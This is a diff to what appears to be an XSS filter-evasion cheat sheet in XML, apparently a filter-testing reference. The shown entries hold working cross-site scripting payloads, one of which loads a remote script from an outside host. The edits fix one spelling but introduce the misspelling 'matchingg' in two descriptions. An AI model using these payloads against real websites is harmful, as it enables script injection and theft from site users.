@@ -689,7 +689,7 @@ As a side note, this was also effective against a real world XSS filter I came a
 	<attack> 
 		<name>Extraneous Open Brackets</name> 
 		<code>&lt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;);//&lt;&lt;/SCRIPT&gt;</code> 
-		<desc>(Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matching pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to supress a JavaScript error.</desc> 
+		<desc>(Submitted by Franz Sedlmaier http://www.pilorz.net/).  This XSS vector could defeat certain detection engines that work by first using matchingg pairs of open and close angle brackets and then by doing a comparison of the tag inside, instead of a more efficient algorythm like Boyer-Moore (http://www.cs.utexas.edu/users/moore/best-ideas/string-searching/) that looks for entire string matches of the open angle bracket and associated tag (post de-obfuscation, of course).  The double slash comments out the ending extraneous bracket to suppress a JavaScript error.</desc> 
 		<label>Embedded Character Attacks</label> 
 		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser> 
 	</attack> 
@@ -969,7 +969,7 @@ The only thing I&apos;ve seen work against this XSS attack if you still want to 
 	<attack> 
 		<name>Filter Evasion 2</name> 
 		<code>&lt;SCRIPT a=&quot;>&apos;>&quot; SRC=&quot;http://ha.ckers.org/xss.js&quot;&gt;&lt;/SCRIPT&gt;</code> 
-		<desc>Here&apos;s an XSS example that bets on the fact that the regex won&apos;t catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly.</desc> 
+		<desc>Here&apos;s an XSS example that bets on the fact that the regex won&apos;t catch a matchingg pair of quotes but will rather find any quotes to terminate a parameter string improperly.</desc> 
 		<label>XSS w/HTML Quote Encapsulation</label> 
 		<browser>Browser support: [&lt;span class=&quot;s&quot;&gt;IE6.0&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;NS8.1-IE&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;NS8.1-G&lt;/span&gt;|&lt;span class=&quot;s&quot;&gt;FF1.5&lt;/span&gt;] [&lt;span class=&quot;s&quot;&gt;O8.54&lt;/span&gt;]</browser> 
 	</attack>
